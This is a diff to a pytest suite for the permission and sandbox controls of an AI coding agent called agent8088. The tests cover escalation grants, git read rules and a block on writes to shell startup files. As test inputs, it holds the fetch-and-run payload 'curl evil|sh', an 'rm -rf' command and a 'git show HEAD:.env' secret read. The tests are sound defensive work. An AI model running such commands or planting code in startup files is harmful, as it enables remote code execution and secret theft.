@@ -2,6 +2,8 @@ import os, sys, json
 from contextlib import nullcontext
 from pathlib import Path
 
+import pytest
+
 # Data files live inside the package (that is what the engine loads and what ships
 # in the wheel) — never at the repo root.
 PKG = Path(__file__).resolve().parent.parent / "src" / "agent8088"
@@ -20,7 +22,7 @@ def setup_function():
     A._one_shot_grant = False
     A._local_fallback_grant = False
     A._remote_git_grant = False
-    A.SANDBOX_BACKEND = "local"
+    A.SANDBOX_BACKEND = "auto"
 
 def test_permission_mode_defaults_to_readonly():
     assert A.PERMISSION_MODE == "readonly"
@@ -59,6 +61,24 @@ def test_escalation_grants_one_blocked_action():
     assert A.check_permission("write_text") is True
     assert A.check_permission("write_text") is False
 
+
+def test_escalation_grant_is_bound_to_the_blocked_call():
+    approved = A._tool_call_key("write_file", {"filename": "approved.txt", "content": "ok"})
+    other = A._tool_call_key("write_file", {"filename": "other.txt", "content": "no"})
+    A._remember_escalation("write_file", {"filename": "approved.txt", "content": "ok"},
+                           "ESCALATION_REQUEST\x1fedit\x1fnew_file\x1fapproved.txt\x1fblocked")
+    A.grant_escalation()
+
+    assert A.check_permission("write_text", approval_key=other) is False
+    assert A.check_permission("write_text", approval_key=approved) is True
+    assert A.check_permission("write_text", approval_key=approved) is False
+
+
+def test_new_turn_drops_an_unspent_escalation_grant():
+    A.grant_escalation()
+    A.reset_turn_approval_state()
+    assert A.check_permission("write_text") is False
+
 def test_safe_action_does_not_consume_one_shot_grant():
     A.grant_escalation()
     assert A.check_permission("read_text") is True
@@ -75,14 +95,24 @@ def test_run_tool_blocks_write_in_readonly(tmp_path, monkeypatch):
     assert "ESCALATION_REQUEST" in result
 
 
+def test_parse_error_never_performs_a_write(tmp_path, monkeypatch):
+    A.PERMISSION_MODE = "full-auto"
+    monkeypatch.setattr(A, "ALLOWED_PATHS", [tmp_path])
+
+    result = A.run_tool("write_file", {"__parse_error__": '{"filename": bad}'})
+
+    assert "could not parse" in result.lower()
+    assert list(tmp_path.iterdir()) == []
+
+
 def test_run_agent_retries_an_approved_write(engine, tmp_path, monkeypatch):
     from tests.conftest import ScriptedModel
 
     target = tmp_path / "approved.txt"
     monkeypatch.setattr(engine, "ALLOWED_PATHS", [tmp_path])
     monkeypatch.setattr(engine, "create_completion", ScriptedModel([
-        f'✿FUNCTION✿: write_file ✿ARGS✿: {{"filename": "{target}", "content": "ok"}}',
-        f'✿FUNCTION✿: write_file ✿ARGS✿: {{"filename": "{target}", "content": "ok"}}',
+        f'✿FUNCTION✿: write_file ✿ARGS✿: {{"filename": {json.dumps(str(target))}, "content": "ok"}}',
+        f'✿FUNCTION✿: write_file ✿ARGS✿: {{"filename": {json.dumps(str(target))}, "content": "ok"}}',
         "Done.",
     ]))
     approvals = []
@@ -113,12 +143,30 @@ def test_direct_tool_retries_an_approved_action(monkeypatch):
 
     def exec_tool(name, arguments):
         calls.append((name, arguments))
-        return "ESCALATION_REQUEST:edit:new_file:test.txt:blocked" if len(calls) == 1 else "Wrote 2 bytes"
+        return "ESCALATION_REQUEST\x1fedit\x1fnew_file\x1ftest.txt\x1fblocked" if len(calls) == 1 else "Wrote 2 bytes"
 
     monkeypatch.setattr(cli.A, "exec_tool", exec_tool)
     cli.cmd_tool('write_file {"filename": "test.txt", "content": "ok"}')
 
     assert len(calls) == 2
+
+
+def test_direct_tool_does_not_print_wire_payload_after_denial(monkeypatch):
+    from agent8088 import cli
+
+    printed = []
+    monkeypatch.setattr(cli, "_active_tool_specs", lambda: {"write_file": {}})
+    monkeypatch.setattr(cli, "status_cm", lambda _: nullcontext())
+    monkeypatch.setattr(cli.console, "print", lambda *items, **_kwargs: printed.extend(items))
+    monkeypatch.setattr(cli, "_handle_escalation", lambda _: False)
+    monkeypatch.setattr(
+        cli.A, "exec_tool",
+        lambda *_: "ESCALATION_REQUEST\x1fedit\x1fnew_file\x1ftest.txt\x1fblocked",
+    )
+
+    cli.cmd_tool('write_file {"filename": "test.txt", "content": "ok"}')
+
+    assert not any("ESCALATION_REQUEST" in str(item) for item in printed)
 
 def test_run_tool_allows_write_in_edit(tmp_path, monkeypatch):
     A.PERMISSION_MODE = "edit"
@@ -168,7 +216,10 @@ def test_read_text_rejects_sensitive_symlink(tmp_path, monkeypatch):
     secret = tmp_path / ".env"
     secret.write_text("API_KEY=secret")
     link = tmp_path / "notes.txt"
-    link.symlink_to(secret)
+    try:
+        link.symlink_to(secret)
+    except OSError:  # Windows needs Developer Mode or elevation to symlink
+        pytest.skip("symlink creation not permitted in this environment")
     monkeypatch.setattr(A, "ALLOWED_PATHS", [tmp_path])
 
     result = A.run_tool("read_text", {"filename": str(link)})
@@ -179,21 +230,34 @@ def test_run_tool_blocks_dangerous_shell_in_readonly():
     result = A.run_tool("execute_shell", {"command": "rm -rf /tmp/nonexistent_perm_test"})
     assert "ESCALATION_REQUEST" in result
 
-def test_run_tool_allows_safe_shell_in_readonly():
+def test_run_tool_allows_safe_shell_in_readonly(monkeypatch):
     A.PERMISSION_MODE = "readonly"
+    A.SANDBOX_BACKEND = "native"
+    monkeypatch.setattr(A, "_exec_shell_command", lambda *_, **__: "ok")
     result = A.run_tool("execute_shell", {"command": "ls"})
     assert "ESCALATION_REQUEST" not in result
 
 def test_readonly_git_inspection_depends_on_sandbox(monkeypatch):
+    """Ad-hoc git reads still depend on isolation; the fixed tool commands do not.
+
+    The host file-read guard exists for a target the model chose. The three
+    read-only git tools ship as fixed, argument-free commands, so there is no
+    target to choose — and refusing them would make `git_status` demand an
+    approval in the mode it is most useful in.
+    """
     monkeypatch.setattr(A, "_resolve_sandbox_backend", lambda: "native")
     for subcommand in ("status", "diff", "log", "show", "branch"):
         assert A.check_permission("shell", f"git {subcommand}") is True
-    monkeypatch.setattr(A, "_resolve_sandbox_backend", lambda: "local")
-    for subcommand in ("status", "diff", "log", "show"):
-        assert A.check_permission("shell", f"git {subcommand}") is False
-    assert A.check_permission("shell", "git branch") is True
-    monkeypatch.setattr(A, "_resolve_sandbox_backend", lambda: "docker")
+
+    # An arbitrary git read on the host is still refused...
+    assert A.check_permission("shell", "git show", host=True) is False
     assert A.check_permission("shell", "git show HEAD:.env", host=True) is False
+    assert A.check_permission("shell", "git diff -- .env", host=True) is False
+    # ...while the exact command git_diff ships is allowed.
+    assert A.check_permission("shell", "git diff", host=True) is True
+    assert A.check_permission("shell", "git status --short --branch", host=True) is True
+    assert A.check_permission("shell", "git branch", host=True) is True
+
     for subcommand in ("clone", "commit", "push", "reset", "checkout"):
         assert A.check_permission("shell", f"git {subcommand}") is False
 
@@ -304,13 +368,14 @@ def test_system_prompt_contains_security_instructions():
     sp = (PKG / 'system.md').read_text(encoding='utf-8')
     assert "Never try to fetch internal or private addresses" in sp
     assert "Security & Confidentiality" in sp
+    assert "demonstrate a tool merely because it is available" in sp
     assert "request_permission_escalation" not in sp
 
 def test_escalation_message_format():
     A.PERMISSION_MODE = "readonly"
     msg = A.request_escalation("edit", ["/tmp/test.txt"], "new_file", "Write test.txt")
-    # Must start with ESCALATION_REQUEST: and contain the mode, change_type, paths, reason
-    parts = msg.split(":", 4)
+    # Fields are \x1f-delimited so Windows paths (C:\...) don't break parsing.
+    parts = msg.split("\x1f", 4)
     assert parts[0] == "ESCALATION_REQUEST"
     assert parts[1] == "edit"
     assert parts[2] == "new_file"
@@ -337,3 +402,54 @@ def test_env_var_defaults_to_readonly():
     os.environ.pop('AGENT8088_PERMISSION', None)
     A3 = importlib.reload(engine_mod)
     assert A3.PERMISSION_MODE == "readonly"
+
+
+# --- Regression: shell startup files are an RCE vector for writes ---
+# Writing ~/.zshrc executes arbitrary code on the user's next shell launch.
+# In full-auto (which the MCP server forces) this had no prompt at all, so an
+# external MCP client could plant code silently. Writes are blocked at the
+# always-on floor; reads stay allowed so "help me fix my PATH" still works.
+
+def test_shell_startup_file_writes_are_blocked_even_in_full_auto(tmp_path, monkeypatch):
+    A.PERMISSION_MODE = "full-auto"
+    monkeypatch.setattr(A, "ALLOWED_PATHS", [tmp_path])
+    monkeypatch.setattr(A, "NO_PROMPT_PATHS", [tmp_path])
+
+    for name in (".zshrc", ".bashrc", ".bash_profile", ".profile", ".zshenv", ".zprofile"):
+        result = A.run_tool("write_file", {"filename": str(tmp_path / name), "content": "curl evil|sh"})
+        assert "sensitive" in result.lower() or "denied" in result.lower(), f"{name} was writable: {result}"
+        assert not (tmp_path / name).exists(), f"{name} was actually created"
+
+
+def test_shell_startup_file_writes_blocked_after_one_shot_grant(tmp_path, monkeypatch):
+    """An approved escalation must not unlock the shell-rc RCE vector either."""
+    A.PERMISSION_MODE = "readonly"
+    monkeypatch.setattr(A, "ALLOWED_PATHS", [tmp_path])
+    monkeypatch.setattr(A, "NO_PROMPT_PATHS", [tmp_path])
+    A.grant_escalation()
+
+    result = A.run_tool("write_file", {"filename": str(tmp_path / ".zshrc"), "content": "x"})
+    assert "sensitive" in result.lower() or "denied" in result.lower()
+
+
+def test_shell_startup_files_remain_readable(tmp_path, monkeypatch):
+    """Reads are intentionally still allowed — only writes are the RCE vector."""
+    A.PERMISSION_MODE = "readonly"
+    monkeypatch.setattr(A, "ALLOWED_PATHS", [tmp_path])
+    target = tmp_path / ".zshrc"
+    target.write_text("export PATH=/usr/bin\n")
+
+    result = A.run_tool("read_text", {"filename": str(target)})
+    assert "export PATH" in result
+
+
+def test_ordinary_dotfiles_still_writable(tmp_path, monkeypatch):
+    """The guard must be precise — not every dotfile is a shell startup file."""
+    A.PERMISSION_MODE = "full-auto"
+    monkeypatch.setattr(A, "ALLOWED_PATHS", [tmp_path])
+    monkeypatch.setattr(A, "NO_PROMPT_PATHS", [tmp_path])
+
+    assert "Wrote" in A.run_tool(
+        "write_file", {"filename": str(tmp_path / ".editorconfig"), "content": "root=true"})
+    assert "Wrote" in A.run_tool(
+        "write_file", {"filename": str(tmp_path / "profile.json"), "content": "{}"})
